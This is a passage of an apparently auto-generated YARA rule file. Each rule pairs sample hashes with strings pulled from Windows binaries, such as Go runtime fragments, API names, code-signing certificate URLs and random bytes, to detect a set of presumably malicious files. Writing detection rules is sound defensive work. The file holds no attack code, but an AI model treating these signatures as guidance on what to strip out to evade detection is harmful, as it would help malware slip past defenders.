      $s17 = "of309Allavdemonstratorcurrently" fullword wide /* score: '4.00'*/
      $s18 = "GFattackfree" fullword wide /* score: '4.00'*/
      $s19 = "the5Partial" fullword wide /* score: '4.00'*/
      $s20 = "HreleaseUniversitybuilt-inbutqthatVDI" fullword wide /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991_cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c0_46 {
   meta:
      description = "dataset - from files b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "b4cfc49d647ebeffb99579dbd4be2a4ca779e3d36b60656aaa9d616ac343e991"
      hash2 = "cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
   strings:
      $s1 = "uireContextWEgyptian_HieroglyphsGetAcceptExSockaddrsGetAdaptersAddressesGetCurrentDirectoryWGetFileAttributesExWGetProcessMemory" ascii /* score: '20.00'*/
      $s2 = " to unallocated span37252902984619140625Arabic Standard TimeAzores Standard TimeCertOpenSystemStoreWCreateProcessAsUserWCryptAcq" ascii /* score: '14.00'*/
      $s3 = "crypto.RegisterHash" fullword ascii /* score: '10.00'*/
      $s4 = "enland Standard TimeGreenwich Standard TimeLogical_Order_ExceptionLord Howe Standard TimeMB during sweep; swept Marquesas Standa" ascii /* score: '10.00'*/
      $s5 = "nmentBlockE. Africa Standard TimeE. Europe Standard TimeFreeEnvironmentStringsWGetEnvironmentVariableWGetSystemTimeAsFileTimeGre" ascii /* score: '8.00'*/
      $s6 = "internal/bytealg.HashStr" fullword ascii /* score: '7.00'*/
      $s7 = "crypto/md5.New" fullword ascii /* score: '7.00'*/
      $s8 = "*hash.Hash" fullword ascii /* score: '7.00'*/
      $s9 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Central Brazilian Standard TimeMoun" ascii /* score: '7.00'*/
      $s10 = "*func() hash.Hash" fullword ascii /* score: '7.00'*/
      $s11 = "crypto.init" fullword ascii /* score: '7.00'*/
      $s12 = "internal/bytealg.HashStrRev" fullword ascii /* score: '7.00'*/
      $s13 = "internal/bytealg.IndexRabinKarp" fullword ascii /* score: '7.00'*/
      $s14 = "crypto/md5.(*digest).Sum" fullword ascii /* score: '7.00'*/
      $s15 = "23283064365386962890625<invalid reflect.Value>Argentina Standard TimeAstrakhan Standard TimeCertGetCertificateChainDestroyEnviro" ascii /* score: '5.00'*/
      $s16 = "crypto/md5.init.0" fullword ascii /* score: '4.00'*/
      $s17 = "crypto/md5.(*digest).Size" fullword ascii /* score: '4.00'*/
      $s18 = "crypto/md5.(*digest).checkSum" fullword ascii /* score: '4.00'*/
      $s19 = "crypto/md5.block" fullword ascii /* score: '4.00'*/
      $s20 = "crypto/md5.(*digest).Reset" fullword ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 9000KB and ( 8 of them )
      ) or ( all of them )
}

rule _080ee6c068e95db7a776793e167fb4bb9ad0efcb424a400ed3efe697400fc73a_2bd9c0ae977d28d89bc7e590e0996274_47 {
   meta:
      description = "dataset - from files 080ee6c068e95db7a776793e167fb4bb9ad0efcb424a400ed3efe697400fc73a, 2bd9c0ae977d28d89bc7e590e0996274"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "080ee6c068e95db7a776793e167fb4bb9ad0efcb424a400ed3efe697400fc73a"
      hash2 = "9edcf9664940435399ce1093902470cd617994b5b1d502fdf17800329ac18242"
   strings:
      $s1 = "(Symantec SHA256 TimeStamping Signer - G3" fullword ascii /* score: '15.00'*/
      $s2 = "(Symantec SHA256 TimeStamping Signer - G30" fullword ascii /* score: '15.00'*/
      $s3 = "TimeStamp-2048-60" fullword ascii /* score: '4.00'*/
      $s4 = "290322235959Z0" fullword ascii /* score: '1.00'*/
      $s5 = "?'J3Nm" fullword ascii /* score: '1.00'*/
      $s6 = "171223000000Z" fullword ascii /* score: '1.00'*/
      $s7 = "290322235959" ascii /* score: '1.00'*/
      $s8 = "310111235959" ascii /* score: '1.00'*/
      $s9 = "U){9FN" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( all of them )
      ) or ( all of them )
}

rule _fee6b3937d208b95c17dc253ba951f3c7c5a332af98f4e0117ee5bbd47e38843_a392f53396b31d45a8f8af623090a4e3065750cf725781000436c34b0e_48 {
   meta:
      description = "dataset - from files fee6b3937d208b95c17dc253ba951f3c7c5a332af98f4e0117ee5bbd47e38843, a392f53396b31d45a8f8af623090a4e3065750cf725781000436c34b0e5683ea, 1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f, a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c, 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9, d4b64e363b4b26f82ca61f3890329c9f0978820f4107eb3d95309bc9adbfd280"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "fee6b3937d208b95c17dc253ba951f3c7c5a332af98f4e0117ee5bbd47e38843"
      hash2 = "a392f53396b31d45a8f8af623090a4e3065750cf725781000436c34b0e5683ea"
      hash3 = "1b11ae98b85bb0645abe36adcd852e6e84b51c6b5c811729f3c19f14f32d4e4f"
      hash4 = "a587b99327aaf93754f87f244be79475c196b08ed9bf670b6903326f701d089c"
      hash5 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      hash6 = "d4b64e363b4b26f82ca61f3890329c9f0978820f4107eb3d95309bc9adbfd280"
   strings:
      $s1 = "http://www.digicert.com/CPS0" fullword ascii /* score: '13.00'*/
      $s2 = "QJxy6z'" fullword ascii /* score: '4.00'*/
      $s3 = "DigiCert Timestamp 20210" fullword ascii /* score: '4.00'*/
      $s4 = "DigiCert, Inc.1 0" fullword ascii /* score: '4.00'*/
      $s5 = "210101000000Z" fullword ascii /* score: '1.00'*/
      $s6 = "31010712" ascii /* score: '1.00'*/
      $s7 = "dwc_#Ri" fullword ascii /* score: '1.00'*/
      $s8 = "310106000000Z0H1" fullword ascii /* score: '1.00'*/
      $s9 = "16010712" ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 8000KB and ( all of them )
      ) or ( all of them )
}

rule _f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0_2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4_49 {
   meta:
      description = "dataset - from files f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0, 2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "f3ba7589f1ca3fb4c27934e454016e4fb162fc6de31ed20bdb8dcfbed077b0d0"
      hash2 = "2278958c65c42569a501f2bc22b6ff070622843ebeccf2a914de5fd7b4bafd03"
   strings:
      $s1 = "L90u H" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s2 = "9>powf" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = ".?AV_Iostream_error_category2@std@@" fullword ascii /* score: '3.00'*/
      $s4 = "tpH91uk" fullword ascii /* score: '1.00'*/
      $s5 = "M?H;MGs H" fullword ascii /* score: '1.00'*/
      $s6 = "taL9Chu" fullword ascii /* score: '1.00'*/
      $s7 = ".?AV?$codecvt@DDU_Mbstatet@@@std@@" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_50 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
      hash3 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash4 = "4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7"
      hash5 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
   strings:
      $s1 = ")too many levels of symbolic linkswaiting for unsupported file type3552713678800500929355621337890625C:\\Windows\\System32\\kern" ascii /* score: '26.00'*/
      $s2 = "itic_HieroglyphsProcessIdToSessionIdQueryServiceConfig2WQueryServiceStatusExRegisterEventSourceWSHGetKnownFolderPathSeek: invali" ascii /* score: '26.00'*/
      $s3 = "oryWGetFileAttributesExWGetProcessMemoryInfoGetWindowsDirectoryWIDS_Trinary_OperatorIsrael Standard TimeJordan Standard TimeMero" ascii /* score: '25.00'*/
      $s4 = "hNameByHandleWGetQueuedCompletionStatusGetSecurityDescriptorDaclGetSecurityDescriptorSaclGetSidIdentifierAuthorityInitiateSystem" ascii /* score: '21.00'*/
      $s5 = "ase.dllOther_Default_Ignorable_Code_PointSetFileCompletionNotificationModesVirtualQuery for stack base failedcrypto/aes: invalid" ascii /* score: '18.00'*/
      $s6 = "k inconsistent fmt: unknown base; can't happeninternal error - misuse of itabinvalid network interface indexmalformed time zone " ascii /* score: '14.00'*/
      $s7 = "ShutdownExWIsValidSecurityDescriptorKaliningrad Standard TimeMiddle East Standard TimeNew Zealand Standard TimeNorth Korea Stand" ascii /* score: '10.00'*/
      $s8 = "ard TimeQueryInformationJobObjectSetSecurityDescriptorDaclSetSecurityDescriptorSaclTransbaikal Standard TimeUS Mountain Standard" ascii /* score: '10.00'*/
      $s9 = ": name offset out of rangeruntime: text offset out of rangeruntime: type offset out of rangeslice bounds out of range [%x:%y]sta" ascii /* score: '9.50'*/
      $s10 = "informationnon in-use span in unswept listpacer: sweep done at heap size pattern contains path separatorreflect: Len of non-arra" ascii /* score: '9.00'*/
      $s11 = "iled mSpanList.insert runtime: failed to decommit pagesruntime: goroutine stack exceeds runtime: memory allocated by OS [runtime" ascii /* score: '9.00'*/
      $s12 = "inorVersionNumberExpandEnvironmentStringsWFindNextVolumeMountPointWFindVolumeMountPointCloseGODEBUG: can not enable \"GetFinalPa" ascii /* score: '8.00'*/
      $s13 = "isaligned func runtime: program exceeds runtime" fullword ascii /* score: '7.00'*/
      $s14 = " buffer overlapdoaddtimer: P already set in timerforEachP: sched.safePointWait != 0illegal base64 data at input byte mspan.ensur" ascii /* score: '7.00'*/
      $s15 = "structure needs cleaningzlib: invalid dictionary bytes failed with errno= to unused region of span with too many arguments 29103" ascii /* score: '7.00'*/
      $s16 = "83045673370361328125AUS Central Standard TimeAUS Eastern Standard TimeAfghanistan Standard TimeCurrentMajorVersionNumberCurrentM" ascii /* score: '7.00'*/
      $s17 = "n requested addresscasgstatus: bad incoming valuescheckmark found unmarked objectencoding/hex: invalid byte: %#Uentersyscallbloc" ascii /* score: '6.00'*/
      $s18 = ".lib section in a.out corrupted11368683772161602973937988281255684341886080801486968994140625Call to VirtualProtect failed!!Cent" ascii /* score: '6.00'*/
      $s19 = "Turkey Standard Timebad defer size classbad font file formatbad system page sizebad use of bucket.bpbad use of bucket.mpchan sen" ascii /* score: '6.00'*/
      $s20 = "d offsetSeek: invalid whenceSetCurrentDirectoryWSetHandleInformationSetVolumeMountPointWTaipei Standard TimeTerminal_Punctuation" ascii /* score: '4.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0_dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a_51 {
   meta:
      description = "dataset - from files 3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0, dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0"
      hash2 = "dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
   strings:
      $s1 = "GUOWWU" fullword ascii /* score: '3.50'*/
      $s2 = "Xbglqv" fullword wide /* score: '3.00'*/
      $s3 = "b}g4gx" fullword ascii /* score: '1.00'*/
      $s4 = "p,nlhm" fullword ascii /* score: '1.00'*/
      $s5 = "bCkc]G" fullword ascii /* score: '1.00'*/
      $s6 = "@o#<ub" fullword ascii /* score: '1.00'*/
      $s7 = "FU65(4" fullword ascii /* score: '1.00'*/
      $s8 = "`RR5,i" fullword ascii /* score: '1.00'*/
      $s9 = "Fv\\w!#" fullword ascii /* score: '1.00'*/
      $s10 = "Y~\"l@cl," fullword ascii /* score: '1.00'*/
      $s11 = "j6uw,B" fullword ascii /* score: '1.00'*/
      $s12 = "t~wb\\_" fullword ascii /* score: '1.00'*/
      $s13 = "9[ybol" fullword ascii /* score: '1.00'*/
      $s14 = "; %%U9I" fullword ascii /* score: '1.00'*/
      $s15 = " BB)0M(7" fullword ascii /* score: '1.00'*/
      $s16 = "?@KDcvl" fullword ascii /* score: '1.00'*/
      $s17 = "_|l6p9" fullword ascii /* score: '1.00'*/
      $s18 = "4Cc1we~" fullword ascii /* score: '1.00'*/
      $s19 = "buk}WsC(" fullword ascii /* score: '1.00'*/
      $s20 = "O=jKLS&" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _3dbe8fb7d2794ceb0e3e87278531bc280385b144d9feec044bf5847e7a6af57d_74f4d0602e6f4937099657fb75a62dddd16cf9e2c87d2964e5e60a9227_52 {
   meta:
      description = "dataset - from files 3dbe8fb7d2794ceb0e3e87278531bc280385b144d9feec044bf5847e7a6af57d, 74f4d0602e6f4937099657fb75a62dddd16cf9e2c87d2964e5e60a9227a5cc68"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "3dbe8fb7d2794ceb0e3e87278531bc280385b144d9feec044bf5847e7a6af57d"
      hash2 = "74f4d0602e6f4937099657fb75a62dddd16cf9e2c87d2964e5e60a9227a5cc68"
   strings:
      $s1 = "_set_new_mode" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s2 = "_get_initial_narrow_environment" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s3 = "_seh_filter_exe" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s4 = "_set_app_type" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
      $s5 = "_register_thread_local_exe_atexit_callback" fullword ascii /* score: '0.00'*/ /* Goodware String - occured 5 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618_2bd9c0ae977d28d89bc7e590e0996274_53 {
   meta:
      description = "dataset - from files 7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618, 2bd9c0ae977d28d89bc7e590e0996274"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "7a51bf0527aa3f38ee5a9ae52c1a4f63d67d68af2da7b488f8ba7b66d665e618"
      hash2 = "9edcf9664940435399ce1093902470cd617994b5b1d502fdf17800329ac18242"
   strings:
      $s1 = "3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%" fullword ascii /* score: '16.00'*/
      $s2 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v" fullword ascii /* score: '16.00'*/
      $s3 = "http://ocsp.sectigo.com0" fullword ascii /* score: '14.00'*/
      $s4 = "2http://crl.sectigo.com/SectigoRSACodeSigningCA.crl0s" fullword ascii /* score: '13.00'*/
      $s5 = "2http://crt.sectigo.com/SectigoRSACodeSigningCA.crt0#" fullword ascii /* score: '13.00'*/
      $s6 = "Sectigo Limited1$0\"" fullword ascii /* score: '6.00'*/
      $s7 = "Jersey City1" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "%USERTrust RSA Certification Authority0" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "New Jersey1" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "The USERTRUST Network1.0," fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s11 = "Sectigo RSA Code Signing CA0" fullword ascii /* score: '2.00'*/
      $s12 = "Sectigo RSA Code Signing CA" fullword ascii /* score: '2.00'*/
      $s13 = "#jYhRB_" fullword ascii /* score: '1.00'*/
      $s14 = "301231235959Z0|1" fullword ascii /* score: '1.00'*/
      $s15 = "301231235959" ascii /* score: '1.00'*/
      $s16 = "2&-jWp" fullword ascii /* score: '1.00'*/
      $s17 = "mt^Ju~" fullword ascii /* score: '1.00'*/
      $s18 = "181102000000Z" fullword ascii /* score: '1.00'*/
      $s19 = "190312000000Z" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 25000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a392f53396b31d45a8f8af623090a4e3065750cf725781000436c34b0e5683ea_2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76_54 {
   meta:
      description = "dataset - from files a392f53396b31d45a8f8af623090a4e3065750cf725781000436c34b0e5683ea, 2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "a392f53396b31d45a8f8af623090a4e3065750cf725781000436c34b0e5683ea"
      hash2 = "2cb4d628278053eba42c82d58fb894c230451ffe70d519ff79c5f1cc76f32fd9"
   strings:
      $s1 = "http://www.digicert.com/CPS0" fullword ascii /* score: '17.00'*/
      $s2 = "5http://cacerts.digicert.com/DigiCertTrustedRootG4.crt0C" fullword ascii /* score: '16.00'*/
      $s3 = "2http://crl3.digicert.com/DigiCertTrustedRootG4.crl0" fullword ascii /* score: '16.00'*/
      $s4 = "http://ocsp.digicert.com0\\" fullword ascii /* score: '14.00'*/
      $s5 = "Phttp://cacerts.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt0" fullword ascii /* score: '13.00'*/
      $s6 = "Mhttp://crl4.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0=" fullword ascii /* score: '13.00'*/
      $s7 = "Mhttp://crl3.digicert.com/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crl0S" fullword ascii /* score: '13.00'*/
      $s8 = "DigiCert Trusted Root G40" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "DigiCert, Inc.1A0?" fullword ascii /* score: '4.00'*/
      $s10 = "8DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA10" fullword ascii /* score: '2.00'*/
      $s11 = "8DigiCert Trusted G4 Code Signing RSA4096 SHA384 2021 CA1" fullword ascii /* score: '2.00'*/
      $s12 = "jj@0HK4" fullword ascii /* score: '1.00'*/
      $s13 = "360428235959Z0i1" fullword ascii /* score: '1.00'*/
      $s14 = "360428235959" ascii /* score: '1.00'*/
      $s15 = "[K]taM?" fullword ascii /* score: '1.00'*/
      $s16 = "210429000000Z" fullword ascii /* score: '1.00'*/
      $s17 = "SA|X=G" fullword ascii /* score: '1.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0_dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a_55 {
   meta:
      description = "dataset - from files 3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0, dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9, d4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d, 43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20, a5cf75e5092bf01d80ce064e03aa336b63f1cf4daba0888d936a071dc323e172, 0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343, a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b, d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "3941ea5a78ec9965bf466cc7c75adf2b898cdfff895f7bbc35bbbc99cf556db0"
      hash2 = "dbd46a9515a1fba42e02eac95c85bba9f699de07d2c5cb04a42d71ac3a86dec9"
      hash3 = "d4eaf26969848d8027df7c8c638754f55437c0937fbf97d0d24cd20dd92ca66d"
      hash4 = "43cd38a962aa63091260f2648304b22e01aea8ea79c23ca16f99d17133f1ba20"
      hash5 = "a5cf75e5092bf01d80ce064e03aa336b63f1cf4daba0888d936a071dc323e172"
      hash6 = "0d032d82dec12b4c35e2724d09ef23f517ee839efd673b26a28cec732ddce343"
      hash7 = "a7cbeeba9fd5f17a1e5be18ea55db5727fe1c7f69471f7b28dae1887900d763b"
      hash8 = "d6a1fddbde5dc3a875d1f31fd0bbd77d0e3d4307724f298015923a5763cbfe3f"
   strings:
      $s1 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii /* score: '11.00'*/
      $s2 = "  <trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v2\">" fullword ascii /* score: '7.00'*/
      $s3 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" fullword ascii /* score: '5.00'*/
      $s4 = "System.Runtime.CompilerServices" fullword ascii /* PEStudio Blacklist: strings */ /* score: '3.05'*/ /* Goodware String - occured 1950 times */
      $s5 = "b77a5c561934e089" ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( all of them )
      ) or ( all of them )
}

rule _83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc_7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc_56 {
   meta:
      description = "dataset - from files 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc"
      hash2 = "7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966"
      hash3 = "89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd"
   strings:
      $s1 = "rg already scannedglobalAlloc.mutexinvalid bit size locked m0 woke upmark - bad statusmarkBits overflownil resource bodyno data " ascii /* score: '27.00'*/
      $s2 = "28421709430404007434844970703125C:\\Windows\\System32\\kernel32.dllCertAddCertificateContextToStoreCertVerifyCertificateChainPol" ascii /* score: '23.00'*/
      $s3 = "ecodeObjectDnsRecordListFreeFLE Standard TimeGC assist markingGMT Standard TimeGTB Standard TimeGetCurrentProcessGetShortPathNam" ascii /* score: '20.00'*/
      $s4 = "GODEBUG: value \"GetComputerNameWGetConsoleWindowGetCurrentThreadGetFullPathNameWGetLogicalDrivesGetLongPathNameWGetPriorityClas" ascii /* score: '16.00'*/
      $s5 = "LogicalDriveStringsWGetSidSubAuthorityCountGetSystemTimeAsFileTimeGreenland Standard TimeGreenwich Standard TimeLogical_Order_Ex" ascii /* score: '16.00'*/
      $s6 = "eWIsTokenRestrictedLookupAccountSidWOld_North_ArabianOld_South_ArabianOther_ID_ContinueRegLoadMUIStringWSentence_TerminalSystemF" ascii /* score: '13.00'*/
      $s7 = "unction036Unified_IdeographWSAEnumProtocolsWWTSQueryUserTokenbad TinySizeClassdebugPtrmask.lockentersyscallblockexec format erro" ascii /* score: '11.00'*/
      $s8 = "GetVolumePathNamesForVolumeNameWMapIter.Value called before NextWSAGetOverlappedResult not found\" not supported for cpu option " ascii /* score: '11.00'*/
      $s9 = "bufio: invalid use of UnreadBytebufio: invalid use of UnreadRunecrypto/aes: input not full blockend outside usable address space" ascii /* score: '10.00'*/
      $s10 = "gesruntime: split stack overflow: slice bounds out of range [%x:]slice bounds out of range [:%x] (types from different packages)" ascii /* score: '9.50'*/
      $s11 = "iHiraganaJavaneseKatakanaKayah_LiLinear_ALinear_BMahajaniNovemberOl_ChikiParseIntPhags_PaQuestionReadFileSaturdaySetEventTagbanw" ascii /* score: '7.00'*/
      $s12 = "CryptQueryObjectDefineDosDeviceWDnsNameCompare_WDuplicateTokenExFindFirstVolumeWFlushFileBuffersGC scavenge waitGC worker (idle)" ascii /* score: '6.00'*/
      $s13 = "ountPointWDestroyEnvironmentBlockE. Africa Standard TimeE. Europe Standard TimeFreeEnvironmentStringsWGetEnvironmentVariableWGet" ascii /* score: '5.00'*/
      $s14 = "aTai_ThamTai_VietThursdayTifinaghTypeAAAATypeAXFRUgariticWSAIoctl[signal " fullword ascii /* score: '4.00'*/
      $s15 = "fail to seek to string table: %vfail to seek to symbol table: %vnumerical argument out of domainpanic while printing panic value" ascii /* score: '3.00'*/
      $s16 = "= is not  mcount= minutes nalloc= newval= nfreed= packed= pointer stack=[ status %!Month(48828125AcceptExArmenianBalineseBopomof" ascii /* score: '3.00'*/
      $s17 = "oBugineseCancelIoCherokeeClassANYCyrillicDecemberDuployanEqualSidEthiopicExtenderFebruaryFullPathGeorgianGoStringGujaratiGurmukh" ascii /* score: '0.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _9d35e17421e9a1c8458f32cd813bd27f_c90860cbcc78e518dfc11584eb096b7d31eb488f43d5c082b816da54cddfae0f_57 {
   meta:
      description = "dataset - from files 9d35e17421e9a1c8458f32cd813bd27f, c90860cbcc78e518dfc11584eb096b7d31eb488f43d5c082b816da54cddfae0f"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "910e449d025890cc10c331f41de133f6865bb8fbe66facafec461b121e9aef1d"
      hash2 = "c90860cbcc78e518dfc11584eb096b7d31eb488f43d5c082b816da54cddfae0f"
   strings:
      $s1 = "DocumentUserPassword" fullword wide /* score: '12.00'*/
      $s2 = "DocumentOwnerPassword" fullword wide /* score: '12.00'*/
      $s3 = "UniresDLL" fullword ascii /* score: '9.00'*/
      $s4 = "ResOption1" fullword ascii /* score: '5.00'*/
      $s5 = "Calibri1*" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s6 = "Calibri Light1" fullword wide /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "TableStyleMedium2PivotStyleLight16" fullword wide /* score: '4.00'*/
      $s8 = "Microsoft Print to PDF" fullword wide /* score: '4.00'*/
      $s9 = "DocumentCryptSecurity" fullword wide /* score: '4.00'*/
      $s10 = "{084F01FA-E634-4D77-83EE-074817C03581}" fullword wide /* score: '1.00'*/
   condition:
      ( uint16(0) == 0xcfd0 and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad_487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae005120_58 {
   meta:
      description = "dataset - from files 8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad, 487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89, 83f06213409abbf39756e856aea050e2b7b40b0c488ac6b966b15cbb2ec1e5fc, 7cd70b5e3a4e9faba7aee9b0a0784d61ed804096f834c773e8357efcdc8be966, 4754626f12467f7a14731030afe57b3ffe6bac1c1a8d2d93a027f0cec5be08e7, 89cb65bfaf8e7cb59a35bca859df284488f1f2264a4845c3bfcf4f82b3c3fcdd, cd8256d1c896a8de9ccf50e26f97106295f4e664aef6ba3ee0883420c01ac374"
      author = "Omar Abusabha"
      reference = "reference.txt"
      date = "2023-06-30"
      hash1 = "8232f63ec9d5569b492e04eba453162076fd79ab634dca162faa664a1a75d3ad"
      hash2 = "487424f7ad546f72d0240922d1c6d9800bfcb95d3582eeecbbae0051208b6f89"
